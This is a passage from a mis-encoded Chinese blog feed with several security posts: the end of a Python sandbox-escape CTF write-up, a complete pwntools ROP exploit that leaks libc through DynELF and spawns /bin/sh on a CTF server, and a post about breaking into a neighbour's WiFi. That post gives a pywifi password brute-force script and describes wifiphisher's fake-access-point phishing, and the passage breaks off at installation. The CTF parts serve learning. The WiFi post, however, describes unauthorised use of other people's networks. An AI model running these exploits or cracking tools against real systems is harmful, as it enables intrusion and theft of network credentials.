class="number">40</span></span><br></pre></td></tr></table></figure><p>æˆ‘ä»¬ä¸èƒ½åœ¨æŒ‘æˆ˜ä¸­ä½¿ç”¨è¿™ä¸ªä»£ç ï¼ˆç”šè‡³é‡å†™ä¸ºåˆ—è¡¨è§£æï¼‰ï¼Œå› ä¸ºå®ƒåŒ…æ‹¬ç©ºæ ¼ã€‚ä½†æ˜¯ç”±äºfileåœ¨ç´¢å¼•40ï¼Œæˆ‘ä»¬å¯ä»¥ç¡¬ç¼–ç ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>]</span><br><span class="line">&lt;type <span class="string">&#x27;file&#x27;</span>&gt;</span><br></pre></td></tr></table></figure><p>ä¸€æ—¦æˆ‘ä»¬å¼•ç”¨äº†æ–‡ä»¶ï¼Œæˆ‘ä»¬æ‰€éœ€è¦åšçš„å°±æ˜¯åˆ›å»ºä¸€ä¸ªæ–‡ä»¶å¯¹è±¡å¹¶è¯»å–å®ƒï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;&gt; ().__class__.__bases__[<span class="number">0</span>].__subclasses__()[<span class="number">40</span>](<span class="string">&quot;./key&quot;</span>).read()</span><br><span class="line"><span class="string">&quot;This works&quot;</span></span><br></pre></td></tr></table></figure><p>æ‰€ä»¥è§£å†³é¢˜ç›®æˆ‘ä»¬éœ€è¦ï¼Œ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045</span><br><span class="line">Go Ahead, Expoit me &gt;;D</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](<span class="string">&quot;./key&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">().__class__.__bases__[0].__subclasses__()[40](<span class="string">&quot;./key&quot;</span>).<span class="built_in">read</span>()</span><br><span class="line">Return Value: FvibLF0eBkCBk</span><br></pre></td></tr></table></figure><p>åœ¨æ—æ³¨ä¸­ï¼Œæˆ‘ä»¬ä¸éœ€è¦åœ¨å•ä¸ªè¯­å¥ä¸­æ‰§è¡Œ - execåœ¨å½“å‰ä¸Šä¸‹æ–‡ä¸­è¿è¡Œä»£ç ï¼Œå› æ­¤é€šè¿‡å°†æ¯ä¸ªå‘½ä»¤çš„è¾“å‡ºå­˜å‚¨åœ¨å˜é‡ï¼ˆé™¤äº†aï¼‰ä¹‹å¤–ï¼Œæˆ‘ä»¬å¯ä»¥è½»æ¾åœ°ä¿æŒå‘½ä»¤ä¹‹é—´çš„çŠ¶æ€ã€‚</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">moshe@moshe-desktop:~$ netcat ctf.fluxfingers.net 2045</span><br><span class="line">Go Ahead, Expoit me &gt;;D</span><br><span class="line">x=23</span><br><span class="line">x=23</span><br><span class="line">Return Value: 23</span><br><span class="line">45</span><br><span class="line">45</span><br><span class="line">Return Value: 45</span><br><span class="line">x</span><br><span class="line">x</span><br><span class="line">Return Value: 23</span><br></pre></td></tr></table></figure><h2 id="å‚è€ƒè¿æ¥"><a href="#å‚è€ƒè¿æ¥" class="headerlink" title="å‚è€ƒè¿æ¥"></a>å‚è€ƒè¿æ¥</h2><ul><li>å¦ä¸€ä¸ªé­”æ³•å¯èƒ½æ˜¯æœ‰ç”¨çš„ï¼šhttp : //<a href="http://www.reddit.com/r/Python/comments/hftnp/ask">www.reddit.com/r/Python/comments/hftnp/ask</a> rpythonæ¢å¤æ¸…é™¤çš„å…¨å±€/ c1v372r</li><li>Ned Batchelderçš„åšæ–‡ï¼šhttp : //nedbatchelder.com/blog/201206/eval really is_dangerous.html</li></ul><h2 id="åè®°"><a href="#åè®°" class="headerlink" title="åè®°"></a>åè®°</h2><p>å…¶å®å‘ç°ï¼Œå›½å†…çš„æ¯”èµ›å’Œå›½å¤–çš„æ¯”èµ›ï¼Œæœ‰äº›èµ›äº‹è´¨é‡çœŸçš„å·®å¾ˆå¤šï¼Œå›½å†…å¾ˆå¤šæ¯”èµ›éƒ½æ˜¯ä¸ºäº†å‡ºé¢˜è€Œå‡ºé¢˜ï¼Œç›¸åï¼Œå…¶å®å›½å¤–çš„æ¯”èµ›è™½ç„¶å¾ˆéš¾ï¼Œä½†æ˜¯æ”»å…‹çš„è¿‡ç¨‹ä¸­ï¼Œéƒ½èƒ½å­¦åˆ°è®¸å¤šçš„å§¿åŠ¿ã€‚</p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>leakæŠ€å·§ä»¥åŠDynELFçš„æ¸©ä¹ </title>
      <link href="Memory-Leak-with-DynELF.html"/>
      <url>Memory-Leak-with-DynELF.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="ç¨‹åºåˆ†æ"><a href="#ç¨‹åºåˆ†æ" class="headerlink" title="ç¨‹åºåˆ†æ"></a>ç¨‹åºåˆ†æ</h1><p>ä¸€ä¸ªç®€å•çš„æº¢å‡ºï¼Œ</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/eynelf-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/eynelf-01.png"></a></p><p>read()å‡½æ•°çš„ä¸æ­£å½“ä½¿ç”¨å¼•èµ·çš„æ¼æ´</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-02.png"></a></p><p>æˆ‘ä»¬åˆ†ææ±‡ç¼–ä»£ç ï¼ŒåŸºæœ¬å¯ä»¥æ¨æ–­å‡ºä»–çš„æº¢å‡ºå­—èŠ‚æ˜¯140ï¼Œå› ä¸ºè¿™é‡Œæˆ‘ä»¬è¦æ±‚ä¸æä¾›libcï¼Œä½†æ˜¯æˆ‘æ²¡éœ€è¦èµ·shellï¼Œé‚£ä¹ˆæ€è·¯å¤§æ¦‚å°±æ˜¯é¦–å…ˆé€šè¿‡DynELFè·å–åˆ°system()çš„åœ°å€åï¼Œæˆ‘ä»¬åˆé€šè¿‡readå°†â€œ/bin/shâ€å†™å…¥åˆ°.bssæ®µä¸Šï¼Œæœ€åå†è°ƒç”¨systemï¼ˆ.bssï¼‰ï¼Œæ‰§è¡Œâ€œ/bin/shâ€ã€‚</p><h1 id="æ„é€ Leakå‡½æ•°"><a href="#æ„é€ Leakå‡½æ•°" class="headerlink" title="æ„é€ Leakå‡½æ•°"></a>æ„é€ Leakå‡½æ•°</h1><p>pwntoolsæä¾›çš„DynELFæ¨¡å—æ¥è¿›è¡Œå†…å­˜æœç´¢ã€‚å…³é”®æˆ‘ä»¬éœ€è¦ä¸€ä¸ªleak(addr)å‡½æ•°ã€‚ä¸€èˆ¬è¿™ç§å‡½æ•°çš„æ„é€ å¦‚ä¸‹ã€‚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">140</span> + p32(writePlt) + p32(vulner) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;address(%#x) =&gt; %s&#x27;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br></pre></td></tr></table></figure><p>éšåå°†è¿™ä¸ªå‡½æ•°ä½œä¸ºå‚æ•°å†è°ƒç”¨d = DynELF(leak, elf=ELF(â€˜./level2â€™))å°±å¯ä»¥å¯¹DynELFæ¨¡å—è¿›è¡Œåˆå§‹åŒ–äº†ã€‚ç„¶åå¯ä»¥é€šè¿‡è°ƒç”¨system_addr = d.lookup(â€˜systemâ€™, â€˜libcâ€™)æ¥å¾—åˆ°libc.soä¸­system()åœ¨å†…å­˜ä¸­çš„åœ°å€ã€‚<br>å…³é”®çš„æ˜¯ï¼Œæˆ‘ä»¬åªèƒ½è°ƒç”¨åˆ°sytem()ï¼Œå´ä¸èƒ½ç›´æ¥èµ·shellï¼Œæˆ‘ä»¬è¿˜éœ€è¦å°†`/bin/sh``å†™åˆ°BSSæ®µ</p><h1 id="å¦‚ä½•æ‰¾åˆ°bssæ®µ"><a href="#å¦‚ä½•æ‰¾åˆ°bssæ®µ" class="headerlink" title="å¦‚ä½•æ‰¾åˆ°bssæ®µ"></a>å¦‚ä½•æ‰¾åˆ°bssæ®µ</h1><p>åœ¨è’¸ç±³çš„æ–‡ç« ä¸­ï¼Œä»–æ˜¯é€šè¿‡<code>readelf -S level2</code>è¿™æ ·çš„å‘½ä»¤ï¼Œæ‰¾æ‰“çš„bssæ®µçš„åœ°å€ï¼Œè€Œæˆ‘æ¯”è¾ƒä¹ æƒ¯ç”¨IDAåšå‰æœŸçš„åˆ†æï¼Œæ‰€ä»¥æˆ‘ä¼šç”¨<code>Shift+F7</code>æ¥æ‰¾bssæ®µï¼Œæ•ˆæœå¦‚ä¸‹</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-03.png"></a></p><p>.bssæ®µæ˜¯ç”¨æ¥ä¿å­˜å…¨å±€å˜é‡çš„å€¼çš„ï¼Œåœ°å€å›ºå®šï¼Œå¹¶ä¸”å¯ä»¥è¯»å¯å†™ã€‚</p><h1 id="æŸ¥æ‰¾gadget-æ„é€ rop"><a href="#æŸ¥æ‰¾gadget-æ„é€ rop" class="headerlink" title="æŸ¥æ‰¾gadget æ„é€ rop"></a>æŸ¥æ‰¾gadget æ„é€ rop</h1><p>æ‰§è¡Œå®Œread()ä¹‹åï¼Œè°ƒç”¨çš„æ˜¯**system(â€œ/bin/sh/â€œ)**ï¼Œæˆ‘ä»¬çŸ¥é“çš„æ˜¯ï¼Œread()çš„å‚æ•°æœ‰ä¸‰ä¸ªï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦ä¿è¯æ ˆå¹³è¡¡ï¼Œéœ€è¦æ„é€ ä¸€ä¸ªpop pop pop ret çš„gadgetï¼Œå¦‚ä½•æ‰¾åˆ°è¿™gadgetå‘¢ï¼Œæ­£å¦‚è’¸ç±³å¤§ç¥è¯´çš„ï¼Œåˆ©ç”¨objdumpï¼Œå…·ä½“æˆ‘ä»¬å¯ä»¥ç”¨å¦‚ä¸‹çš„å‘½ä»¤<br><code>objdump -D level2 |cat -n |grep pop</code>æ•ˆæœå¦‚ä¸‹:<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-04.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/dynelf-04.png"></a></p><p>è¿™æ ·ï¼Œæˆ‘ä»¬æ‰¾åˆ°è¿™æ ·è¿ç»­çš„3ä¸ªpopï¼Œå°±èƒ½æ„é€ ropäº†ã€‚</p><h1 id="æœ€ç»ˆexp"><a href="#æœ€ç»ˆexp" class="headerlink" title="æœ€ç»ˆexp"></a>æœ€ç»ˆexp</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment">#context.log_level = &#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p = process(&quot;./level4.0f9cfa0b7bb6c0f9e030a5541b46e9f0&quot;)</span></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p = remote(<span class="string">&#x27;pwn2.jarvisoj.com&#x27;</span>,<span class="number">9880</span>)</span><br><span class="line"></span><br><span class="line">vulner = <span class="number">0x0804844b</span></span><br><span class="line">readPlt = <span class="number">0x08048310</span></span><br><span class="line">writePlt = <span class="number">0x08048340</span></span><br><span class="line">bssAddr = <span class="number">0x0804a024</span></span><br><span class="line">pppr =  <span class="number">0x08048509</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">leak</span>(<span class="params">address</span>):</span></span><br><span class="line">    payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">140</span> + p32(writePlt) + p32(vulner) + p32(<span class="number">1</span>) + p32(address) + p32(<span class="number">4</span>)</span><br><span class="line">    p.send(payload)</span><br><span class="line">    data = p.recv(<span class="number">4</span>)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&#x27;address(%#x) =&gt; %s&#x27;</span> % (address, (data <span class="keyword">or</span> <span class="string">&#x27;&#x27;</span>).encode(<span class="string">&#x27;hex&#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line">d = DynELF(leak, elf=ELF(<span class="string">&#x27;./level4&#x27;</span>))</span><br><span class="line">systemAddr = d.lookup(<span class="string">&#x27;system&#x27;</span>, <span class="string">&#x27;libc&#x27;</span>)</span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;systemAddr = %#x&#x27;</span> % (systemAddr)</span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;a&#x27;</span> * <span class="number">140</span> + p32(readPlt) + p32(pppr) + p32(<span class="number">0</span>) + p32(bssAddr) + p32(<span class="number">8</span>)</span><br><span class="line">payload += p32(systemAddr) + p32(<span class="number">0xdeadbeef</span>) + p32(bssAddr)</span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.send(<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="http://wooyun.bestwing.top:5000/static/drops/papers-7551.html">åŸæ–‡åœ°å€</a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>è¹­éš”å£çš„WiFI</title>
      <link href="WiFi_Attack.html"/>
      <url>WiFi_Attack.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h1><p>æœ€è¿‘åœ¨å®¶ï¼Œç”±äºæŸäº›åŸå› å®¶é‡Œè¿˜æ²¡ç½‘ã€‚è€æ˜¯å»åˆ«äººå®¶è¹­ï¼Œéƒ½ä¸å¥½æ„æ€äº†ã€‚ä¹Ÿè¯•ç€è·‘éš”å£çš„å¼±å£ä»¤ï¼Œä½†æ˜¯æ²¡è§£å†³ï¼Œæƒ³è·‘Pinå§ï¼Œä½†æ˜¯æ²¡ç¯å¢ƒã€‚å‡ ç»æŒ«æŠ˜ï¼Œæœ€åç»ˆäºæ‹¿ä¸‹äº†ï¼Œå¯æ˜¯ä¿¡å·å¥½å·®â€¦â€¦</p><h1 id="æ¦‚è¿°"><a href="#æ¦‚è¿°" class="headerlink" title="æ¦‚è¿°"></a>æ¦‚è¿°</h1><p>å…¶å®ï¼Œæˆ‘ä»¬è¹­åˆ°éš”å£æ— çº¿çš„æ–¹æ³•ï¼Œæœ€ç¬¨çš„æœ‰å’±ä»¬å¯ä»¥è·‘è·‘å­—å…¸é˜¿ï¼Œè¯•è¯•å¼±å£ä»¤é˜¿ï¼Œå®åœ¨ä¸è¡Œï¼Œå’±ä»¬å¯ä»¥åˆ©ç”¨Kaliä¸‹çš„å·¥å…·è·‘è·‘Pinç ï¼Œç”šè‡³åšä¸€äº›æ›´çŒ¥ççš„äº‹æƒ…ã€‚æ¯”å¦‚ä¸‹é¢çš„å†…å®¹ã€‚</p><h1 id="0x01-è·‘å­—å…¸"><a href="#0x01-è·‘å­—å…¸" class="headerlink" title="0x01 è·‘å­—å…¸"></a>0x01 è·‘å­—å…¸</h1><p>ä¸€å¼€å§‹æˆ‘è¯•äº†å‡ ä¸ªå¼±å£ä»¤ï¼Œä½†æ˜¯è™½ç„¶æ˜¯å°æ‘å­ï¼Œä½†æ˜¯éš”å£çš„wifiè¿˜æ˜¯ä¸å°‘ï¼Œæˆ‘æ€»ä¸èƒ½ä¸€ä¸ªä¸€ä¸ªè¯•å§ï¼Œè¿™ä¸€ç‚¹éƒ½ä¸ä¼˜é›…ï¼Œæ‰€ä»¥æƒ³åˆ°ä¹‹å‰çœ‹åˆ°çš„pythonçš„ä¸€ä¸ªæ¨¡å—ï¼Œå«<strong>pywifi</strong>ã€‚å¾— å’±ä»¬å†™ä¸€ä¸ªè„šæœ¬æ¥è·‘è·‘å¯†ç å§ã€‚</p><p>å…³é”®ä»£ç å¦‚ä¸‹<br><strong>çƒ­ç‚¹æ‰«æ</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">scans</span>(<span class="params">face,timeout</span>):</span></span><br><span class="line">    <span class="comment">#å¼€å§‹æ‰«æ</span></span><br><span class="line">    face.scan()</span><br><span class="line">    time.sleep(timeout)</span><br><span class="line">    <span class="comment">#åœ¨è‹¥å¹²ç§’åè·å–æ‰«æç»“æœ</span></span><br><span class="line">    <span class="keyword">return</span> face.scan_results()</span><br></pre></td></tr></table></figure><p><strong>çƒ­ç‚¹æ”»å‡»</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attack</span>(<span class="params">i,face,x,key,stu,ts</span>):</span></span><br><span class="line">    <span class="comment">#æ˜¾ç¤ºå¯¹åº”ç½‘ç»œåç§°ï¼Œè€ƒè™‘åˆ°éƒ¨åˆ†ä¸­æ–‡åå•§æ˜¾ç¤ºbssid</span></span><br><span class="line">    showID = x.bssid <span class="keyword">if</span> len(x.ssid)&gt;len(x.bssid) <span class="keyword">else</span> x.ssid</span><br><span class="line">    <span class="comment">#è¿­ä»£å­—å…¸å¹¶è¿›è¡Œçˆ†ç ´</span></span><br><span class="line">    <span class="keyword">for</span> n,k <span class="keyword">in</span> enumerate(key):</span><br><span class="line">        x.key = k.strip()</span><br><span class="line">        <span class="comment">#ç§»é™¤æ‰€æœ‰çƒ­ç‚¹é…ç½®</span></span><br><span class="line">        face.remove_all_network_profiles()</span><br><span class="line">        <span class="comment">#è®²å°è£…å¥½çš„ç›®æ ‡å°è¯•è¿æ¥</span></span><br><span class="line">        face.connect(face.add_network_profile(x))</span><br><span class="line">        <span class="comment">#åˆå§‹åŒ–çŠ¶æ€ç ï¼Œè€ƒè™‘åˆ°ç”¨0ä¼šå‘ç”Ÿäº›é€»è¾‘é”™è¯¯</span></span><br><span class="line">        code = <span class="number">10</span></span><br><span class="line">        t1 = time.time()</span><br><span class="line">        <span class="comment">#å¾ªç¯åˆ·æ–°çŠ¶æ€ï¼Œå¦‚æœç½®ä¸º0åˆ™å¯†ç é”™è¯¯ï¼Œå¦‚è¶…æ—¶åˆ™è¿›è¡Œä¸‹ä¸€ä¸ª</span></span><br><span class="line">        <span class="keyword">while</span> code!=<span class="number">0</span> :</span><br><span class="line">            time.sleep(<span class="number">0.1</span>)</span><br><span class="line">            code = face.status()</span><br><span class="line">            now = time.time()-t1</span><br><span class="line">            <span class="keyword">if</span> now&gt;ts:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            stu.write(<span class="string">&quot;\r%-*s| %-*s| %s |%*.2fs| %-*s |  %-*s %*s&quot;</span>%(<span class="number">6</span>,i,<span class="number">18</span>,showID,code,<span class="number">5</span>,now,<span class="number">7</span>,x.signal,<span class="number">10</span>,len(key)-n,<span class="number">10</span>,k.replace(<span class="string">&quot;\n&quot;</span>,<span class="string">&quot;&quot;</span>)))</span><br><span class="line">            stu.flush()</span><br><span class="line">            <span class="keyword">if</span> code == <span class="number">4</span>:</span><br><span class="line">                face.disconnect()</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;%-*s| %s | %*s |%*s\n&quot;</span>%(<span class="number">20</span>,x.ssid,x.bssid,<span class="number">3</span>,x.signal,<span class="number">15</span>,k)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="comment">#æ‰«ææ—¶å¸¸</span></span><br><span class="line">    scantimes = <span class="number">3</span></span><br><span class="line">    <span class="comment">#å•ä¸ªå¯†ç æµ‹è¯•å»¶è¿Ÿ</span></span><br><span class="line">    testtimes = <span class="number">15</span></span><br><span class="line">    output = sys.stdout</span><br><span class="line">    <span class="comment">#ç»“æœæ–‡ä»¶ä¿å­˜è·¯å¾„</span></span><br><span class="line">    files = <span class="string">&quot;TestRes.txt&quot;</span></span><br><span class="line">    <span class="comment">#å­—å…¸åˆ—è¡¨</span></span><br><span class="line">    keys = open(sys.argv[<span class="number">1</span>],<span class="string">&quot;r&quot;</span>).readlines()</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;|KEYS %s&quot;</span>%(len(keys))</span><br><span class="line">    <span class="comment">#å®ä¾‹åŒ–ä¸€ä¸ªpywifiå¯¹è±¡</span></span><br><span class="line">    wifi = PyWiFi()</span><br><span class="line">    <span class="comment">#é€‰æ‹©å®šä¸€ä¸ªç½‘å¡å¹¶èµ‹å€¼äºiface</span></span><br><span class="line">    iface = wifi.interfaces()[<span class="number">0</span>]</span><br><span class="line">    <span class="comment">#é€šè¿‡ifaceè¿›è¡Œä¸€ä¸ªæ—¶å¸¸ä¸ºscantimesçš„æ‰«æå¹¶è·å–é™„è¿‘çš„çƒ­ç‚¹åŸºç¡€é…ç½®</span></span><br><span class="line">    scanres = scans(iface,scantimes)</span><br><span class="line">    <span class="comment">#ç»Ÿè®¡é™„è¿‘è¢«å‘ç°çš„çƒ­ç‚¹æ•°é‡</span></span><br><span class="line">    nums = len(scanres)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;|SCAN GET %s&quot;</span>%(nums)</span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;%s\n%-*s| %-*s| %-*s| %-*s | %-*s | %-*s %*s \n%s&quot;</span>%(<span class="string">&quot;-&quot;</span>*<span class="number">70</span>,<span class="number">6</span>,<span class="string">&quot;WIFIID&quot;</span>,<span class="number">18</span>,<span class="string">&quot;SSID OR BSSID&quot;</span>,<span class="number">2</span>,<span class="string">&quot;N&quot;</span>,<span class="number">4</span>,<span class="string">&quot;time&quot;</span>,<span class="number">7</span>,<span class="string">&quot;signal&quot;</span>,<span class="number">10</span>,<span class="string">&quot;KEYNUM&quot;</span>,<span class="number">10</span>,<span class="string">&quot;KEY&quot;</span>,<span class="string">&quot;=&quot;</span>*<span class="number">70</span>)</span><br><span class="line">    <span class="comment">#å°†æ¯ä¸€ä¸ªçƒ­ç‚¹ä¿¡æ¯é€ä¸€è¿›è¡Œæµ‹è¯•</span></span><br><span class="line">    <span class="keyword">for</span> i,x <span class="keyword">in</span> enumerate(scanres):</span><br><span class="line">        <span class="comment">#æµ‹è¯•å®Œæ¯•åï¼ŒæˆåŠŸçš„ç»“æœè®²å­˜å‚¨åˆ°filesä¸­</span></span><br><span class="line">        res = test(nums-i,iface,x,keys,output,testtimes)</span><br><span class="line">        <span class="keyword">if</span> res:</span><br><span class="line">            open(files,<span class="string">&quot;a&quot;</span>).write(res)</span><br></pre></td></tr></table></figure><p><em>ä½œè€…ï¼šé¢åŒ…å›<br>é“¾æ¥ï¼š<a href="https://zhuanlan.zhihu.com/p/25149544">https://zhuanlan.zhihu.com/p/25149544</a></em></p><p>ä½†æ˜¯ä¸€ç‚¹è½¯ç”¨éƒ½æ²¡æœ‰ï¼Œæ²¡è¾™ï¼Œéš¾é“æˆ‘ä¹Ÿè¦å»è·‘Pinç å—ï¼Ÿä½†æ˜¯å³°å›è·¯è½¬ï¼Œæˆ‘çœ‹åˆ°è¿™ç¯‡æ–‡ç« é™„èµ äº†ä¸€ä¸ªé“¾æ¥ã€‚</p><h1 id="0x02-wifiphisher"><a href="#0x02-wifiphisher" class="headerlink" title="0x02 wifiphisher"></a>0x02 wifiphisher</h1><p><strong>ä¸»è¦åŸç†</strong></p><ul><li>åˆ›å»ºä¸€ä¸ªä¼ªAPæ¥â€œç‹¸çŒ«æ¢å¤ªå­â€ï¼Œç„¶åæ’¤é”€ç”¨æˆ·APçš„æˆæƒï¼Œ</li><li>é€šçŸ¥ç”¨æˆ·éœ€è¦è¿›è¡Œâ€œå›ºä»¶å‡çº§â€ï¼Œéœ€è¦é‡æ–°éªŒè¯å¯†ç ã€‚ä½ çš„å‡APç”±äºå…·æœ‰ç›¸åŒçš„SSIDï¼Œç”¨æˆ·ä¾¿ä¼šâ€œäº¤ä»£â€å¯†ç ã€‚</li><li>è¿™æ ·ä½ å°±èƒ½å¾—åˆ°ç”¨æˆ·çš„å¯†ç ï¼Œå¹¶ä¸”è®©ç”¨æˆ·é‡‡ç”¨ä½ çš„ä¼ªAPåšä¸ºè‡ªå·±çš„æ¥å…¥ç‚¹ã€‚è€Œå¯¹æ–¹ä¸€æ— æ‰€çŸ¥ã€‚</li></ul><p>ä»æ–‡ç« çš„ä»‹ç»æ¥çœ‹ï¼Œæ˜¯æœ‰ç›¸ä¼¼çš„è„šæœ¬çš„ï¼Œæ¯”å¦‚å®ƒæ‰€æåˆ°çš„<code>Airsnaf</code>ï¼Œä¸è¿‡è¿™é‡Œæ–‡ç« æ‰€è¯´çš„æ˜¯Wifiphisher<br>Githubæºç  <a href="https://github.com/sophron/wifiphisher/releases/">é“¾æ¥</a><br><strong>å®‰è£…</strong></p><figure class="highlight bash"><table><tr><td 